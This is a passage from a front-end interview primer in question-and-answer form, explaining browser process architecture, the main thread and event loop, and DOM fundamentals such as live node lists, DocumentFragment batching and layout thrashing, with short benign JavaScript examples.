---
type: interview-prep
---

# Front End Interview Primer — 333 Questions

Comprehensive Q+A primer for front-end interviews, focused on **how the browser works and how to build fast, correct web front ends** — the engineering, not the visual styling. A System Fundamentals companion covering browser internals (rendering path, JS engine, event loop), cookies/storage/security, the network, and web performance (loading, runtime, Core Web Vitals). Framework-agnostic: concepts illustrated with vanilla JS, cross-referencing the Security, Networking, Concurrency, and Testing primers rather than duplicating them.

Each answer is interview-shaped: opinionated, concrete, with real JS/HTML/HTTP code, ASCII/rendering-pipeline diagrams, and comparison tables (localStorage vs sessionStorage vs cookies vs IndexedDB, reflow vs repaint vs composite, CSR vs SSR vs SSG vs ISR, HTTP/1.1 vs 2 vs 3, macro- vs microtasks). Warm-up ("what's the DOM", "cookie vs localStorage", "what is the event loop") to senior ("walk the critical rendering path", "explain hydration and its cost", "diagnose a janky scroll", "why does this closure leak memory", "how do you cut LCP/INP").

1. [[#Front-End Fundamentals & the Browser]]
2. [[#HTML & the DOM]]
3. [[#The Critical Rendering Path]]
4. [[#The JavaScript Engine]]
5. [[#The Event Loop & Async JS]]
6. [[#JavaScript Language Internals]]
7. [[#The DOM Event Model]]
8. [[#Cookies, Sessions & Web Storage]]
9. [[#Browser Security Model]]
10. [[#HTTP & Networking from the Browser]]
11. [[#Browser Caching]]
12. [[#Web Performance — Loading]]
13. [[#Web Performance — Runtime & Rendering]]
14. [[#Core Web Vitals & Measurement]]
15. [[#Rendering Strategies]]
16. [[#State & Data Fetching]]
17. [[#Web APIs & Browser Capabilities]]
18. [[#Accessibility & Semantics]]
19. [[#Front-End Architecture & Build Tooling]]
20. [[#Front-End Testing & Debugging]]
21. [[#Front-End Scenario & Interview Playbooks]]

## Front-End Fundamentals & the Browser

### Summary

**What this topic covers**

The machine your code actually runs on. Before a single line of a framework matters, there is a **browser** — a large, multi-process C++ application that turns a URL into pixels, and turns clicks into events your JavaScript can see. This topic covers what a browser *is* (a multi-process system: browser process, one or more renderer processes, GPU process, network/utility processes), what lives inside a renderer (a **rendering engine** like Blink/WebKit/Gecko *plus* a **JS engine** like V8/JSC/SpiderMonkey), and the single most important operational fact for a front-end engineer: **almost everything you write runs on one thread — the main thread — and that thread also does layout and paint.** The 16 questions here frame the whole primer. Get the mental model of "URL to pixels" and "one busy main thread" right, and every later topic (the critical rendering path, the event loop, web performance, hydration) is just detail filled into this skeleton.

**Mental model**

Picture the browser as an operating system for the web, not a document viewer. A single tab is not one program — it is several OS processes cooperating. The **browser process** owns the chrome (address bar, tabs), coordinates everything, and is the only one allowed to talk to the disk and network directly. Each site gets a sandboxed **renderer process** that parses HTML/CSS, runs your JS, and computes the page — but it cannot touch the OS; it asks the browser process for everything. A shared **GPU process** rasterizes and composites pixels. Inside a renderer, two engines share the same main thread: the **rendering engine** (builds the DOM/CSSOM, does layout and paint) and the **JS engine** (parses and executes your JavaScript). Because they share the thread, your slow `for` loop literally blocks the page from painting. The senior instinct that flows from this: "what is the main thread doing right now, and how do I keep it free?" Everything fast on the web is about *not* blocking that thread — offloading to compositor threads, workers, the GPU, or the network.

**Key terms**

- **Browser process** — the privileged coordinator; owns UI, disk, network, and spawns/sandboxes the others.
- **Renderer process** — sandboxed, one per site (roughly); parses content, runs JS, computes the page. Where you live.
- **GPU process** — shared; rasterizes tiles and composites layers into the final image on screen.
- **Rendering engine** — Blink (Chrome/Edge), WebKit (Safari), Gecko (Firefox); builds DOM+CSSOM, does layout and paint.
- **JS engine** — V8 (Chrome/Node), JavaScriptCore (Safari), SpiderMonkey (Firefox); parses and executes JS.
- **Main thread** — the one thread per renderer that runs JS, style, layout, and paint. The bottleneck.
- **Compositor thread** — separate renderer thread that can scroll and animate transforms/opacity *without* the main thread.
- **Site isolation** — putting each origin in its own process so a compromised page can't read another's memory (Spectre-era defence).
- **Sandbox** — the OS-level jail a renderer runs in; no direct file/network access, must ask the browser process.
- **IPC** — inter-process communication; how renderer, browser, and GPU processes message each other.

**Why interviewers ask this**

This separates people who "use React" from engineers who understand the platform. A junior answer to "what happens when you type a URL?" stops at "it makes a request and shows the page." A senior answer names DNS, TLS, the response streaming into a renderer process, the parser building the DOM, CSS blocking render, JS potentially blocking parsing, and the compositor putting pixels on the GPU — and knows *which of those is on the critical path*. Interviewers use browser-internals questions as a proxy for whether you can debug performance and correctness problems that the framework can't hide: why a page is janky, why first paint is slow, why an animation drops frames. Knowing there is a main thread — and that it is precious — is the single highest-leverage fact in front-end engineering.

**Common confusions**

- "The browser is single-threaded" — no; the *browser* is many processes and many threads. It's your *JavaScript* (per renderer) that is effectively single-threaded on the main thread.
- "Renderer = the thing that draws" — the renderer process does parsing, JS, style, layout *and* paint; drawing to screen is finished by the GPU process compositing.
- "Chrome is V8" — V8 is only the JS engine. The rendering engine (Blink) is separate and far larger; it owns the DOM, CSS, layout, and paint.
- "Each tab is one process" — closer to "each *site* is one process" (site isolation); one tab can host several renderer processes (iframes from other origins).
- "The GPU does the layout" — no; layout and paint-order are computed on the CPU/main thread; the GPU rasterizes and composites the resulting layers.

**What follows from this topic**

Everything. "URL to pixels" expands into **The Critical Rendering Path** (DOM→CSSOM→render tree→layout→paint→composite). "One busy main thread" expands into the **event loop** and **web performance — runtime** (long tasks, jank, INP). "The DOM the parser builds" is the next topic, **HTML & the DOM**. The JS engine mentioned here gets its own deep dive (V8, hidden classes, JIT, GC). Keep returning to the two anchors — *multi-process browser, single main thread per renderer* — and the rest of the primer coheres.

### Q1. What actually happens when you type a URL and press Enter — from URL to pixels?

At a high level, roughly these stages. It's the canonical front-end interview opener; know the shape and which parts block.

```
URL → DNS lookup → TCP + TLS handshake → HTTP request
    → server responds with HTML → browser starts parsing
    → HTML → DOM tree   (bytes streamed in)
    → CSS  → CSSOM      (render-blocking)
    → DOM + CSSOM → render tree → layout → paint → composite → PIXELS
    → JS runs (can block parsing), event loop takes over for interactivity
```

Key beats to mention:
- **Navigation** happens in the browser process; it hands the response to a **renderer process**.
- The parser builds the **DOM incrementally** as bytes arrive — the browser doesn't wait for the whole file.
- **CSS is render-blocking**; a synchronous `<script>` is **parser-blocking**.
- Pixels are produced by **layout → paint → composite**, the last step on the GPU.

Depth signal: say *which* steps you'd optimize (TLS/preconnect, TTFB, render-blocking CSS/JS) rather than just listing them. This whole flow is unpacked in the Critical Rendering Path topic; the network legs cross-reference the Networking primer (DNS/TCP/TLS).

### Q2. Describe the browser's multi-process architecture. Why isn't it one process?

Modern browsers split work across processes:

| Process | Responsibility | Privilege |
|---|---|---|
| Browser | UI/chrome, tabs, coordination, disk + network | High (unsandboxed) |
| Renderer | Parse HTML/CSS, run JS, layout, paint — per site | Low (sandboxed) |
| GPU | Rasterize + composite layers to screen | Medium |
| Network/Utility | Fetching, decoding, out-of-process services | Low |

Three reasons it's not one process:
- **Stability** — a crash in one renderer kills one tab, not the browser.
- **Security** — renderers run untrusted web content in a **sandbox** with no direct OS access; **site isolation** puts each origin in its own process so a Spectre-style side-channel can't read another origin's data.
- **Performance** — work parallelizes across CPU cores; the GPU process centralizes graphics.

The cost is **IPC** overhead and higher memory use (each process has its own heap and V8 instance) — the tradeoff browsers accept for isolation.

### Q3. What's inside a renderer process? Distinguish the rendering engine from the JS engine.

A renderer bundles two distinct engines that share the main thread:

- **Rendering engine** (Blink in Chrome/Edge, WebKit in Safari, Gecko in Firefox) — owns the DOM, CSS parsing, the CSSOM, style resolution, **layout**, and **paint**. This is the bulk of the browser.
- **JS engine** (V8 in Chrome, JavaScriptCore in Safari, SpiderMonkey in Firefox) — parses and executes JavaScript, manages the JS heap and garbage collection.

They are separate components but cooperate constantly: your JS calls `document.createElement` (rendering engine's DOM API), the rendering engine dispatches a `click` event that runs your JS handler. Crucially, **both run on the same main thread** — so a long-running JS task blocks style and layout, and a huge layout blocks JS. Node.js reuses V8 *without* Blink, which is exactly why there's no `document` in Node: the JS engine and rendering engine are independent.

### Q4. What is the main thread and why do front-end engineers obsess over it?

The **main thread** is the single thread in a renderer process that runs, in an interleaved loop: **JavaScript execution, style calculation, layout, paint recording, and event handling.** Because it's one thread, these compete. If your JS runs for 200ms, the browser cannot process clicks, cannot run layout, cannot paint — the page is frozen for 200ms.

This is *the* front-end performance principle. A frame budget at 60fps is **~16.6ms**; anything on the main thread eating into that drops frames ("jank"). Any single task over **50ms** is a "long task" and hurts responsiveness (it's what **INP** measures). So the entire craft of front-end performance reduces to: *keep the main thread free.* You do that by moving work to **Web Workers** (CPU off-thread), the **compositor thread** (scroll/transform/opacity animations), the **GPU** (compositing), or the **network/service worker** — or by simply doing less work and breaking long tasks into chunks.

### Q5. If JS is "single-threaded," how does the browser do so many things at once?

"Single-threaded" describes **your JavaScript**, not the browser. Your JS runs on one main thread per renderer, one task at a time, via the **event loop**. But the browser is deeply multi-threaded *around* your code:

- **Networking** happens off-thread (network process) — `fetch` doesn't block.
- **Compositing and scrolling** run on the **compositor thread** — a page can scroll smoothly even while the main thread is busy (as long as you didn't force main-thread scroll with a non-passive listener).
- **Rasterization** runs on raster threads / the GPU process.
- **Web Workers** give you *additional* JS threads with no DOM access, communicating via `postMessage`.

So concurrency is real; it's the *DOM-touching, app-logic* thread that's serialized. The mental model: your JS is a single cashier, but there's a whole warehouse of threads behind them. The event loop is how the cashier picks the next customer — covered in its own topic.

### Q6. What does a front-end engineer actually need to understand *beneath* the framework?

React/Vue/Svelte are abstractions over three browser realities they cannot hide:

1. **The DOM and the rendering pipeline** — frameworks ultimately produce DOM mutations that trigger layout and paint. If you don't know reflow vs repaint vs composite, you can't explain why a component is janky.
2. **The event loop and the single main thread** — hooks, effects, and state updates are scheduled onto tasks and microtasks. Hydration, `startTransition`, and "why is my input laggy" all live here.
3. **The network and caching** — data fetching, waterfalls, cache headers, and bundle loading are browser/HTTP concerns the framework merely wraps.

The honest framing for an interview: frameworks manage *when and what* to mutate in the DOM; the browser decides *how expensive* that mutation is. Senior engineers debug at the browser layer when the framework's abstraction leaks — and it always eventually leaks under performance pressure.

### Q7. Compare the major browser engines. Why does it matter which one a user has?

| Browser | Rendering engine | JS engine |
|---|---|---|
| Chrome / Edge / Brave | Blink | V8 |
| Safari (+ all iOS browsers) | WebKit | JavaScriptCore |
| Firefox | Gecko | SpiderMonkey |

Why it matters:
- **iOS**: every browser on iOS — including "Chrome" and "Firefox" — is required to use **WebKit** under the hood. So Safari's engine behaviour is unavoidable for iOS users; you test against WebKit whether you like it or not.
- **Feature and bug divergence**: new APIs ship on different timelines; layout and CSS edge cases differ. This is why you feature-detect (`if ('IntersectionObserver' in window)`) rather than sniff user agents.
- **Performance characteristics** differ (GC behaviour, JIT tiers), though rarely enough to change architecture.

The practical takeaway: build to standards, feature-detect, and test on at least Blink + WebKit.

### Q8. What is site isolation and what security problem does it solve?

**Site isolation** puts pages from different sites into different renderer **processes**, even when one is embedded in another (a cross-origin iframe gets its own process). The problem it solves is **memory disclosure via side channels** — specifically Spectre/Meltdown-class attacks, where speculative execution lets code read memory it shouldn't within the same process. Before site isolation, an evil ad in an iframe shared the victim page's renderer memory and could potentially read its data.

By enforcing a process boundary per site, the OS memory protection between processes becomes a real security boundary: attacker code simply isn't in the same address space as victim data. It's the browser-side complement to the **same-origin policy** (which is a *logical* boundary within a page) — cross-reference the Browser Security topic and the Security primer. The cost is memory: more processes, more V8 heaps.

### Q9. Where does the GPU fit in? What runs on it vs the CPU?

The **CPU / main thread** computes *what* the page looks like: it builds the DOM/CSSOM, resolves styles, runs **layout** (geometry) and **paint** (records draw commands per layer). The **GPU** (via the GPU process) does **rasterization** (turning those draw commands into actual pixels for tiles) and **compositing** (stacking the layers, applying transforms/opacity, and drawing the final frame to the screen).

The performance lever this exposes: animations of **`transform` and `opacity`** can be handled almost entirely by the compositor + GPU, *bypassing layout and paint on the main thread* — which is why they stay smooth even under main-thread load. Animating `top`/`left`/`width` instead forces main-thread layout+paint every frame and janks. "Promote to a compositor layer" (e.g. `will-change: transform`) is a GPU-offload technique. Detail lives in the Critical Rendering Path and runtime-performance topics.

### Q10. Why can a heavy JavaScript task freeze the entire page, including scrolling and clicks?

Because JS, event dispatch, style, layout, and paint all share **one main thread**. While a synchronous JS task runs, the event loop cannot pick up the next task — so queued `click`s, `input`s, timers, and *rendering steps* all wait. The page is literally unresponsive until the task returns.

```javascript
// This freezes the tab for the whole loop — no clicks, no paint, no scroll-into-JS
button.addEventListener('click', () => {
  const start = Date.now();
  while (Date.now() - start < 3000) {} // 3s of blocked main thread
});
```

Nuance: *compositor-driven* scrolling can still work if you used passive listeners and only animate transform/opacity — but anything requiring the main thread (React re-render, non-passive scroll handler, layout) is stuck. The fixes: break work into chunks (yield to the event loop), move CPU work to a **Web Worker**, or defer non-urgent work. This is the concrete face of "keep the main thread free."

### Q11. What is a Web Worker and when does it earn its keep?

A **Web Worker** is a separate JS thread in the renderer with **no DOM access** and no shared memory by default — it communicates with the main thread via `postMessage` (structured-clone copied data) or a `SharedArrayBuffer` for shared memory.

```javascript
// main.js
const worker = new Worker('crunch.js');
worker.postMessage(bigDataset);
worker.onmessage = (e) => render(e.data); // result comes back, main thread stayed free
// crunch.js
onmessage = (e) => postMessage(expensiveProcess(e.data));
```

Earn-its-keep cases: **CPU-bound work** that would otherwise block the main thread — parsing large JSON/CSV, image processing, cryptography, running a diffing/search algorithm, syntax highlighting. It's *not* for I/O (fetch is already async and off-thread) and not for DOM work (workers can't touch the DOM). The rule of thumb: if a task is pure computation over data and takes more than a frame, a worker keeps the UI responsive. Related: **Service Workers** are a different thing (a network proxy), covered under caching.

### Q12. Node.js runs JavaScript but has no `document`. Why? What does this tell you about the browser?

Node.js embeds **V8 — the JS engine — without Blink, the rendering engine.** `document`, `window`, the DOM API, `fetch`'s original form, and CSSOM all live in the *rendering engine*, not the language or the JS engine. So Node has the language (closures, promises, the event loop concept) but none of the browser's document object model.

This is a clean demonstration of the earlier point: **the JS engine and the rendering engine are separable.** The DOM is not part of JavaScript; it's a set of host objects the browser injects into the global scope. It also explains why server-side rendering libraries need `jsdom` (a JS reimplementation of the DOM) to run component code outside a browser, and why "isomorphic" code must guard `typeof window !== 'undefined'`. Cross-reference the Testing primer's note on `jsdom` limits.

### Q13. What is IPC in the browser and why should a front-end engineer care?

**IPC (inter-process communication)** is how the sandboxed renderer talks to the privileged browser process and the GPU process — since the renderer can't touch disk, network, or the screen directly, it *messages* another process to do it. Every navigation, network request, cookie read, and final composite crosses an IPC boundary.

Why care: it's a real, if usually small, cost, and it explains architecture. A renderer asking the browser process for a cookie or a file is not free. More importantly, IPC is *why* the security model works — the boundary is enforceable because it's a process boundary with message passing, not a function call. For day-to-day work you rarely optimize IPC directly, but knowing it exists explains why some operations that "feel local" (storage, some device APIs) are actually asynchronous round-trips.

### Q14. How is the browser both an application *and* a platform? What implications does that have?

A browser is a shipped application (chrome, tabs, settings) *and* a runtime platform that executes untrusted third-party programs (every website). That dual nature drives its defining constraints:

- **Untrusted code by default** — every page is potentially hostile, so renderers are sandboxed and the **same-origin policy** isolates sites. You never get to assume the code is friendly.
- **Backwards compatibility forever** — the web can't break old sites, so the platform accretes APIs and rarely removes them. This is why there's `var` *and* `let`, `XMLHttpRequest` *and* `fetch`.
- **Capability negotiation** — new powers (camera, notifications, clipboard) are permission-gated and feature-detected, because you're running on an unknown version of an unknown engine.

Implication for engineers: you code defensively against an environment you don't control — feature-detect, degrade gracefully, and never trust the client. This mindset underpins the Security and Web Performance topics.

### Q15. What's the difference between the compositor thread and the main thread, and why does it decide whether scrolling is smooth?

The **main thread** runs JS, style, layout, and paint. The **compositor thread** takes the already-painted layers and moves/combines them (scrolling the page, applying `transform`/`opacity`) — independently of the main thread.

This split is why scrolling *can* stay at 60fps even while the main thread is busy: the compositor just shifts existing layers. But you can break it. A **non-passive** `wheel`/`touchstart` listener forces the browser to wait for the main thread (in case you call `preventDefault`), coupling scroll to the busy thread and causing jank. Declaring `{ passive: true }` promises you won't prevent default, letting the compositor scroll freely:

```javascript
el.addEventListener('touchstart', onTouch, { passive: true }); // compositor can scroll now
```

Same story for animations: transform/opacity = compositor-only = smooth; width/top/left = main-thread layout = janky. This is the runtime-performance payoff of the multi-thread model.

### Q16. Give the one-paragraph "how a page becomes pixels" answer you'd give a senior interviewer.

"The browser process fetches the HTML over DNS→TCP→TLS→HTTP and streams it into a sandboxed renderer. The rendering engine parses HTML into the **DOM** incrementally, and CSS into the **CSSOM** — CSS is render-blocking, and any synchronous script pauses parsing while V8 executes it. DOM and CSSOM combine into the **render tree**, which drives **layout** (computing geometry) and **paint** (recording draw commands into layers) on the main thread. Those layers go to the **GPU process**, which rasterizes and **composites** them into the frame on screen. From then on the **event loop** on the main thread drives everything — running tasks and microtasks, handling events, and re-running the pipeline as needed, ideally within a 16.6ms frame budget. The whole job of front-end performance is keeping that main thread free so the pipeline can hit every frame."

That answer hits every anchor: multi-process, incremental parse, render-blocking CSS, parser-blocking JS, layout/paint/composite, GPU, event loop, frame budget. Each clause is a topic in this primer.

## HTML & the DOM

### Summary

**What this topic covers**

The bridge between the HTML you write and the tree your JavaScript manipulates. The central, interview-critical idea: **the DOM is not your HTML.** HTML is a *string of bytes* — a serialization format. The **DOM (Document Object Model)** is a live, in-memory *tree of objects* that the browser's parser builds from that string, that CSS and JS then modify, and that the browser renders. `document.body.innerHTML` and "View Source" can disagree because one is the current tree and the other is the original text. This topic covers how the parser builds the tree, the anatomy of the tree (nodes, elements, attributes, text nodes), the **DOM API** you use to read and mutate it, **semantic HTML** and why it matters for accessibility and structure, batching tools like **`DocumentFragment`**, the trap of **live vs static** node lists, and how synchronous scripts pause parsing (a preview of `defer`/`async`). The 16 questions treat the DOM as what it really is to an engineer: a data structure you traverse and mutate, with a real performance cost when you do.

**Mental model**

Think: **HTML is source code; the DOM is the running data structure; the rendered page is the output.** The parser is a compiler front-end — it tokenizes the HTML byte stream and constructs a tree of node objects, fixing up malformed markup along the way (HTML is famously forgiving; the parser inserts missing `<tbody>`, closes unclosed tags, etc.). Once built, the tree is *live*: JS can create, move, and delete nodes, and the browser keeps the rendered output in sync. Every node is an object with properties (`textContent`, `children`, `parentNode`) and every element exposes methods (`querySelector`, `setAttribute`, `append`). The performance mental model layered on top: **reading layout-dependent properties or writing to the DOM can force the browser to recompute layout.** So you don't think of DOM operations as free field access — you think of them as calls into the rendering engine that may trigger reflow. Batch your reads, batch your writes, and mutate off-screen structures (`DocumentFragment`) before attaching them. The DOM is a tree you own; treating it carelessly is where jank is born.

**Key terms**

- **HTML** — the serialized markup text; a *format*, not the tree. What the server sends and "View Source" shows.
- **DOM** — the live in-memory object tree the parser builds from HTML; what `document` gives you.
- **Node** — the base type of everything in the tree (elements, text, comments, the document itself).
- **Element** — a node corresponding to a tag (`<div>`); a subtype of Node with attributes and children.
- **Text node** — a node holding character data; the whitespace between tags becomes text nodes too.
- **Attribute vs property** — HTML attribute (`setAttribute`, the initial serialized value) vs the DOM object's live JS property (`el.value`); they can diverge.
- **Semantic HTML** — using elements for their meaning (`<nav>`, `<button>`, `<main>`) so the structure is machine-readable for a11y and SEO.
- **DocumentFragment** — a lightweight, off-document container node; append to it, then insert once, to avoid repeated reflow.
- **Live NodeList / HTMLCollection** — a collection that auto-updates as the DOM changes (`getElementsByTagName`, `.children`).
- **Static NodeList** — a snapshot that does *not* update (`querySelectorAll`).
- **CSSOM** — the parallel tree the browser builds from CSS; combines with the DOM to render (next topic).
- **Parser-blocking script** — a synchronous `<script>` that pauses DOM construction while it downloads and runs.

**Why interviewers ask this**

"What is the DOM?" is the fastest way to sort candidates. A weak answer says "the DOM is the HTML." A strong answer says "the DOM is the object tree the browser builds *from* the HTML, and they can differ — the HTML is a one-time text input; the DOM is the live structure." From there, interviewers probe whether you understand the *cost* of DOM manipulation, because that's where real bugs and jank live: do you know that `querySelectorAll` returns a static list but `.children` is live? That reading `offsetHeight` in a loop after each write causes **layout thrashing**? That building a list with a `DocumentFragment` beats appending 1,000 nodes one at a time? Senior signal is treating the DOM as a performance-sensitive data structure, not a magic bag of elements. It also gates the whole rendering-path conversation — you can't discuss reflow without knowing what's reflowing.

**Common confusions**

- "The DOM is the HTML" — no. HTML is the serialized text; the DOM is the live object tree built from it and mutated afterward. `document.documentElement.outerHTML` reflects the *current* tree, not the original source.
- "innerHTML and the source are the same" — after any JS mutation (or parser fix-ups of invalid markup), they diverge. View-Source shows bytes; DevTools' Elements panel shows the live DOM.
- "querySelectorAll returns a live list" — it's **static** (a snapshot). `getElementsByClassName`/`.children` are **live**. Iterating a live list while mutating it is a classic infinite-loop/skip bug.
- "Attributes and properties are the same" — `setAttribute('value', 'x')` sets the initial attribute; the user typing changes the `.value` *property*, and the attribute won't follow. They're linked but distinct.
- "The virtual DOM is the DOM" — the virtual DOM (React) is a JS object *description* used to compute minimal real-DOM changes; it's a library optimization, not a browser concept.
- "Whitespace doesn't create nodes" — it does; text nodes for indentation are why `firstChild` is often a text node, not the first element (use `firstElementChild`).

**What follows from this topic**

The DOM is one half of what the browser renders; the other half is the **CSSOM**, and combining them is the **Critical Rendering Path** — the next topic. The cost of DOM reads/writes previews **runtime web performance** (reflow vs repaint, layout thrashing, virtualization). Semantic HTML previews the **Accessibility** topic (the accessibility tree is derived from semantic DOM). Parser-blocking scripts preview the **`defer`/`async`** discussion in the rendering path. And `addEventListener` on DOM nodes leads straight into the **DOM Events** topic (capture/bubble, delegation).

### Q1. What is the DOM, and how is it different from HTML?

**HTML** is a **serialization format** — a string of text (bytes) describing the page. **The DOM (Document Object Model)** is the **live, in-memory tree of objects** the browser's parser *builds from* that HTML, exposes to JavaScript via `document`, and keeps in sync with what's rendered.

The distinction is the whole answer:
- HTML is a one-time *input*; the DOM is a *living structure* you can read and mutate after load.
- They can **diverge**: the parser fixes invalid markup (inserts `<tbody>`, closes tags), and any JS that runs `element.append(...)` changes the DOM without changing the original HTML source.

```javascript
// The HTML said <p>Hi</p>. After this line the DOM differs from the source:
document.querySelector('p').textContent = 'Changed';
// "View Source" still shows "Hi"; the DOM (and DevTools Elements) shows "Changed".
```

Mental model: **HTML is source code, the DOM is the running data structure, the pixels are the output.** Confusing the source string with the live tree is the most common junior tell.

### Q2. How does the browser build the DOM from an HTML byte stream?

The parser runs a pipeline, **incrementally** as bytes arrive (it doesn't wait for the whole file):

```
bytes → characters (decode via charset) → tokens (<div>, "text", </div>)
      → nodes → DOM tree
```

- **Tokenizing**: the parser scans the character stream and emits tokens for start tags, end tags, and text.
- **Tree construction**: tokens become node objects linked into the tree, with parent/child/sibling relationships.
- **Error recovery**: HTML parsing is defined to be lenient — unclosed tags get closed, misnested tags get reordered, missing `<tbody>` gets inserted. That's why "invalid" HTML still renders (and why the DOM often differs from the literal source).

Because it's incremental, the browser can start rendering before the HTML finishes downloading — but a synchronous `<script>` **pauses** this construction (Q11). The parser also kicks off a **preload scanner** that looks ahead for `<img>`, `<link>`, `<script>` to start downloads early even while blocked.

### Q3. Walk the node types in the DOM tree. What's a Node vs an Element?

**Node** is the base interface; everything in the tree is a Node. **Element** is a subtype of Node (tags). The common node types:

- **Document** — the root (`document`); the entry point.
- **Element** — a tag: `<div>`, `<p>`, `<button>`. Has attributes and can have children.
- **Text** — character data between tags. Whitespace/indentation becomes Text nodes too.
- **Comment** — `<!-- ... -->`.
- **DocumentFragment** — a lightweight container not attached to the document (Q9).

The trap this creates: node-level traversal includes text nodes, element-level traversal skips them.

```javascript
el.childNodes      // NodeList — includes text nodes (whitespace!)
el.children        // HTMLCollection — elements only
el.firstChild      // often a whitespace Text node
el.firstElementChild // the first actual element — usually what you want
```

Interviewers use this to see if you know why `firstChild` "unexpectedly" returns whitespace: because indentation is a real Text node in the tree.

### Q4. What's the difference between an HTML attribute and a DOM property?

An **attribute** is what's written in the HTML and set via `getAttribute`/`setAttribute` — it's the *initial, serialized* value. A **property** is a field on the live DOM object. They're linked at parse time but **can diverge** afterward:

```html
<input id="name" value="alice">
```
```javascript
const el = document.getElementById('name');
el.getAttribute('value'); // "alice"  — the attribute (initial)
el.value;                 // "alice"  — the property (current)

// User types "bob" in the field:
el.value;                 // "bob"    — property tracks live state
el.getAttribute('value'); // "alice"  — attribute still the initial value!
```

Rules of thumb: read/write **properties** (`.value`, `.checked`, `.className`) for live state; use **attributes** for custom `data-*` values and initial config. Some attributes reflect to properties (`id`, `href`) and some don't (`value` after user input). Getting this wrong is a classic form-bug source.

### Q5. What is semantic HTML and why does it matter to an engineer (not a designer)?

**Semantic HTML** means choosing elements for their *meaning*, not their default appearance: `<nav>`, `<header>`, `<main>`, `<article>`, `<button>`, `<label>` instead of a soup of `<div>` and `<span>`. It matters for engineering reasons, not aesthetics:

- **Accessibility** — the browser derives the **accessibility tree** from the semantic DOM. A `<button>` is focusable, keyboard-activatable, and announced as "button" for free; a `<div onclick>` is none of those unless you manually add `role`, `tabindex`, and key handlers.
- **Behavior for free** — `<button>` fires on Enter/Space and participates in forms; `<a href>` is navigable and right-click-openable. Rebuilding that on a `<div>` is bug-prone.
- **Structure/SEO** — landmarks (`<nav>`, `<main>`) let assistive tech and crawlers understand the page.

The engineer's rule: **reach for the semantic element first; add ARIA only to fill gaps** ("no ARIA is better than bad ARIA"). This threads directly into the Accessibility topic.

### Q6. Live vs static node lists — what's the difference and why is it a bug magnet?

A **live** collection auto-updates as the DOM changes; a **static** collection is a frozen snapshot.

| API | Type | Live? |
|---|---|---|
| `getElementsByTagName` / `getElementsByClassName` | HTMLCollection | **Live** |
| `element.children` | HTMLCollection | **Live** |
| `querySelectorAll` | NodeList | **Static** |
| `childNodes` | NodeList | **Live** |

The classic bug — iterating a **live** list while mutating it:

```javascript
const items = document.getElementsByClassName('item'); // LIVE
for (let i = 0; i < items.length; i++) {
  items[i].remove(); // removing shrinks the live list → indices shift → skips elements
}
```

Fixes: use the **static** `querySelectorAll` (snapshot survives mutation), iterate backwards, or `Array.from(...)` to copy. Live lists have a use (they stay current without re-querying) but they surprise people. Knowing which API returns which is a strong DOM-fluency signal.

### Q7. Why is DOM manipulation "expensive"? Show a slow pattern and a fast one.

DOM writes aren't plain field assignments — they can invalidate layout, and reading layout properties forces the browser to **synchronously recompute** it. Doing many small, attached mutations makes the browser reflow repeatedly.

Slow — appending nodes one at a time, each attached to the live tree:

```javascript
const ul = document.querySelector('ul');
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `Item ${i}`;
  ul.append(li); // touches the live, rendered tree 1000 times
}
```

Fast — build off-document in a `DocumentFragment`, attach once:

```javascript
const frag = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  li.textContent = `Item ${i}`;
  frag.append(li); // not in the rendered tree → no per-item reflow
}
ul.append(frag); // ONE insertion into the live DOM
```

The principle — **batch writes, minimize touches to the live tree** — is the DOM face of the reflow/layout-thrashing story in the performance topic.

### Q8. What is layout thrashing and how do you avoid it?

**Layout thrashing** (forced synchronous reflow) is interleaving DOM *writes* with *reads of layout-dependent properties*, forcing the browser to recompute layout on every iteration:

```javascript
// BAD: read (offsetHeight) forces layout AFTER each write → N reflows
for (const el of boxes) {
  const h = el.offsetHeight;      // read → forces layout (flush pending writes)
  el.style.height = h * 2 + 'px'; // write → invalidates layout again
}
```

Every read of `offsetHeight`/`offsetTop`/`getBoundingClientRect`/`scrollTop` after a pending write forces the browser to flush and recompute layout *right now*. Fix by **batching all reads first, then all writes**:

```javascript
// GOOD: one layout for all reads, then writes that invalidate once
const heights = boxes.map(el => el.offsetHeight); // all reads
boxes.forEach((el, i) => { el.style.height = heights[i] * 2 + 'px'; }); // all writes
```

For visual changes, do writes in `requestAnimationFrame` so they land before the next paint. Libraries call this "read/write batching." It's one of the highest-yield runtime-performance fixes and a favorite senior question.

### Q9. What is a DocumentFragment and when do you reach for one?

A **`DocumentFragment`** is a minimal, standalone container node that is **not part of the rendered document**. You append children to it freely — no reflow, no paint, because it's off-screen — and when you insert the fragment into the live DOM, its *children* are moved in (the fragment wrapper itself disappears) in a **single** operation.

```javascript
const frag = document.createDocumentFragment();
options.forEach(text => {
  const opt = document.createElement('option');
  opt.textContent = text;
  frag.append(opt);
});
select.append(frag); // one DOM insertion, one reflow — not N
```

Reach for it when you're building a chunk of DOM to insert at once (list rows, table bodies, option lists). It's the vanilla-JS batching primitive that predates virtual DOMs. Note that modern engines optimize `innerHTML`-based construction well too, but `DocumentFragment` keeps you in node-object land (safe from HTML-injection, keeps event listeners) — relevant to the XSS discussion in Browser Security.

### Q10. How do you traverse and search the DOM efficiently?

The core APIs:

```javascript
// Searching from a root (document or any element):
document.getElementById('main');        // fastest single lookup, id-indexed
el.querySelector('.card > h2');         // first match, CSS selector, static
el.querySelectorAll('li');              // all matches, STATIC NodeList

// Structural traversal (element-only, skips text nodes):
el.parentElement;
el.children;                            // live HTMLCollection
el.firstElementChild / lastElementChild;
el.nextElementSibling / previousElementSibling;
el.closest('.container');               // walk UP to nearest matching ancestor
el.matches('.active');                  // boolean test
```

Efficiency notes: **scope your queries** — `container.querySelector(...)` searches a subtree, not the whole document. Cache results instead of re-querying in loops. `getElementById` is index-backed and fastest for a known id. `closest()` is the idiomatic way to find an ancestor (crucial for **event delegation** — Q from the Events topic). Prefer `querySelectorAll` (static) when you'll mutate during iteration.

### Q11. How does a synchronous `<script>` affect DOM parsing?

A plain `<script src="...">` is **parser-blocking**: when the parser hits it, it *stops building the DOM*, downloads the script (if external), executes it in V8, and only then resumes parsing. The rationale is that the script might call `document.write` or read/modify the DOM built so far, so the browser can't safely continue.

```html
<p>Before</p>
<script src="big.js"></script>  <!-- parser halts here: download + run before continuing -->
<p>After</p>                     <!-- this <p> isn't in the DOM until big.js finishes -->
```

Consequences: a slow script in `<head>` delays the entire DOM (and first paint). The fixes preview the rendering-path topic:
